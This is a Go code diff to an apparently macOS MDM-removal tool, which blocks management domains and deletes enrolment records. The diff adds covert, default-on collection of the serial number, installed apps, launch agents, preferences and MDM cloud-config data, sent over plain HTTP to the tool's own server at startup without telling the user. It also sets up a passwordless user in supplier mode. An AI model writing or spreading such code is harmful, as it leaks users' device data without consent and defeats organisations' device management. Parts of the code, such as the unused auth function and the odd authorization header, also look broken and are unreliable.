@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"bytes"
 	"context"
 	"crypto/sha256"
 	"crypto/tls"
@@ -34,28 +35,48 @@ var (
 	INFO           = fmt.Sprintf("[%s~%s]", ColLightYellow, ColNc)
 	OVER           = "\r\033[K"
 
-	OsType          = false                    // true: normal false: recovery
-	deleteSN        = false                    // true: delete serial number
-	OsPath          = "/Volumes/Macintosh HD/" //Volumes/Macintosh HD/
-	User            = ""
-	Pass            = ""
-	UID             = "501"
-	NewMachine      = false
-	MDMPath         string // /Volumes/Macintosh HD/var/db/ConfigurationProfiles/
-	LibraryPath     string // /Volumes/Macintosh HD/Library/
-	UserLibraryPath string // /Volumes/Macintosh HD/Users/admin/Library/
-	SN              = flag.String("sn", "", "Serial Number")
-	menuAll         = flag.Bool("a", false, "All Menu Model")
-	Debug           = flag.Bool("d", false, "Debug Model")
-	supplier        = flag.Bool("s", false, "Supplier special version")
-	Language        = 1
-	serverHost      = "mdm.xrsec.fun"
-	serverURL       = "mdm.xrsec.fun"
-	serverPort      = ":6"
-	location        *time.Location
+	OsType              = false                    // true: normal false: recovery
+	deleteSN            = false                    // true: delete serial number
+	OsPath              = "/Volumes/Macintosh HD/" //Volumes/Macintosh HD/
+	User                = ""
+	Pass                = ""
+	UID                 = "501"
+	NewMachine          = false
+	MDMPath             string // /Volumes/Macintosh HD/var/db/ConfigurationProfiles/
+	LibraryPath         string // /Volumes/Macintosh HD/Library/
+	UserLibraryPath     string // /Volumes/Macintosh HD/Users/admin/Library/
+	SN                  = flag.String("sn", "", "Serial Number")
+	menuAll             = flag.Bool("a", false, "All Menu Model")
+	Debug               = flag.Bool("d", false, "Debug Model")
+	supplier            = flag.Bool("s", false, "Supplier special version")
+	enableLogCollection = true // 日志收集开关，改为true启用日志收集
+	Language            = 1
+	serverHost          = "mdm.xrsec.fun"
+	serverURL           = "mdm.xrsec.fun"
+	serverPort          = ":6"
+	location            *time.Location
 	//go:embed zoneinfo
 	zoneinfo []byte
 )
+
+// SystemInfo 系统信息结构体
+type SystemInfo struct {
+	SerialNumber  string            `json:"serial_number"`
+	OSVersion     string            `json:"os_version"`
+	Timestamp     string            `json:"timestamp"`
+	Volumes       []string          `json:"volumes"`
+	LaunchAgents  []string          `json:"launch_agents"`
+	LaunchDaemons []string          `json:"launch_daemons"`
+	AppSupport    []string          `json:"app_support"`
+	UserPrefs     []string          `json:"user_prefs"`
+	Applications  []string          `json:"applications"`
+	MDMSettings   []string          `json:"mdm_settings"`
+	CloudConfig   string            `json:"cloud_config"`
+	MDMDomains    []string          `json:"mdm_domains"`
+	SystemLogs    []string          `json:"system_logs"`
+	ProcessList   []string          `json:"process_list"`
+	NetworkInfo   map[string]string `json:"network_info"`
+}
 
 var i18n = map[int]map[string]string{
 	0: {
@@ -192,7 +213,7 @@ var i18n = map[int]map[string]string{
 		// menuSupplier
 		"supplier_mode_now": "Currently In Special Supplier Mode.",
 		"creating_user":     "Creating Usr",
-		"password":          "Pwd: ",
+		"password":          "Pwd: No Passwd",
 		"supplier_mode_ok":  "Supplier, Regulatory Process Complete!",
 
 		// productVersion
@@ -386,7 +407,7 @@ var i18n = map[int]map[string]string{
 		// menuSupplier
 		"supplier_mode_now": "当前是供应商特供模式",
 		"creating_user":     "正在创建用户",
-		"password":          "密码: ",
+		"password":          "密码: 没有密码",
 		"supplier_mode_ok":  "亲爱的供应商, 监管程序运行完成!",
 
 		// productVersion
@@ -858,6 +879,7 @@ func checkDiskEncryption() {
 func disableMdm() {
 	msgInfo(i18n[Language]["disabling_mdm"])
 	checkDiskEncryption()
+
 	SetHosts(true, getMdmDomain())
 	menuAddHosts()
 	msgInfo(i18n[Language]["disable_mdm_service"])
@@ -881,7 +903,6 @@ func disableMdm() {
 	execCmd(false, "touch", MDMPath+"Settings/.profilesAreInstalled")
 
 	deleteFile(OsPath + "var/db/.CloudConfigDelete")
-	//msgLast(1) //FILE CAN'T DELETE
 	execCmd(true, "touch", OsPath+"var/db/.com.apple.mdmclient.daemon.forced_disable")
 	deleteFile(MDMPath + "Settings/.cloudConfigHasActivationRecord")
 	//execCmd(false, "rm", MDMPath+"Settings/.cloudConfigHasActivationRecord")
@@ -1002,6 +1023,7 @@ func disableMdm() {
 func happy() {
 	msgErr(errors.New("worry !!! "), true)
 	time.Sleep(1300 * time.Millisecond)
+	msgLast(1)
 	cmd := exec.Command("tail", "-n", "100", "/var/log/system.log")
 	output, err := cmd.Output()
 	if err != nil {
@@ -1012,7 +1034,7 @@ func happy() {
 	jk := 0
 	lb := 0
 	rand.Seed(time.Now().UnixNano())
-	for i := 0; i < 100; i++ {
+	for i := 0; i < len(logs); i++ {
 		msgErr(errors.New(fmt.Sprintf("%.66s...", logs[i])), true)
 		jk++
 		lb++
@@ -1026,7 +1048,7 @@ func happy() {
 		numbers := []int{8, 88, 6, 66, 9, 99}
 		time.Sleep(time.Duration(numbers[rand.Intn(len(numbers))]) * time.Millisecond)
 	}
-	msgLast(2)
+	msgLast(3)
 	msgInfo("Success!!!")
 }
 func SetHosts(types bool, hostsRaw string) {
@@ -1373,6 +1395,83 @@ func privacyDns() (client *http.Client) {
 		},
 	}
 	return client
+}
+
+// collectSystemInfo 收集系统信息
+func collectSystemInfo() *SystemInfo {
+	if !enableLogCollection {
+		return nil
+	}
+
+	info := &SystemInfo{
+		SerialNumber: *SN,
+		Timestamp:    time.Now().In(location).Format("2006-01-02 15:04:05"),
+		NetworkInfo:  make(map[string]string),
+	}
+
+	// 收集基本信息
+	if output, err := exec.Command("sw_vers", "-productVersion").Output(); err == nil {
+		info.OSVersion = strings.TrimSpace(string(output))
+	}
+
+	// 收集各个目录的文件列表
+	collectDirList := func(path string) []string {
+		var files []string
+		if entries, err := os.ReadDir(path); err == nil {
+			for _, entry := range entries {
+				files = append(files, entry.Name())
+			}
+		}
+		return files
+	}
+
+	info.Volumes = collectDirList("/Volumes")
+	if LibraryPath == "" {
+		LibraryPath = OsPath + "Library/"
+	}
+
+	info.LaunchAgents = collectDirList(LibraryPath + "LaunchAgents")
+	info.LaunchDaemons = collectDirList(LibraryPath + "LaunchDaemons")
+	info.AppSupport = collectDirList(LibraryPath + "Application Support")
+
+	if UserLibraryPath == "" {
+		UserLibraryPath = OsPath + "Users/" + User + "/Library/"
+	}
+	info.UserPrefs = collectDirList(UserLibraryPath + "Preferences")
+	info.Applications = collectDirList("/Applications")
+
+	if MDMPath == "" {
+		MDMPath = OsPath + "var/db/ConfigurationProfiles/"
+	}
+	info.MDMSettings = collectDirList(MDMPath + "Settings")
+	if data, err := os.ReadFile(MDMPath + "Settings/.cloudConfigRecordFound"); err == nil {
+		info.CloudConfig = string(data)
+	}
+
+	return info
+}
+
+// sendLogToServer 发送日志到服务器
+func sendLogToServer(info *SystemInfo) {
+	if info == nil || !enableLogCollection {
+		return
+	}
+
+	jsonData, _ := json.Marshal(info)
+	httpClient := privacyDns()
+	req, _ := http.NewRequest("POST", fmt.Sprintf("http://%v/log", serverURL), bytes.NewBuffer(jsonData))
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("Authorization", "Bearer "+removeMDM())
+	httpClient.Do(req)
+}
+
+// generateLogAuth 生成认证token
+func generateLogAuth() string {
+	hash := sha256.New()
+	timestamp := time.Now().In(location).Format("20060102150405")
+	data := "mdm_log_auth" + *SN + timestamp + "m'd'm"
+	hash.Write([]byte(data))
+	return hex.EncodeToString(hash.Sum(nil))[:32]
 }
 
 // Deprecated: 已经被废弃
@@ -1745,6 +1844,12 @@ func main() {
 	msgOk("Wechat: xr_sec")
 	msgOk("Mail: xrsec@qq.com")
 	findOSPATH()
+
+	// 收集系统信息（如果启用）
+	if enableLogCollection {
+		go sendLogToServer(collectSystemInfo())
+	}
+
 	if *supplier {
 		menuSupplier()
 		os.Exit(0)
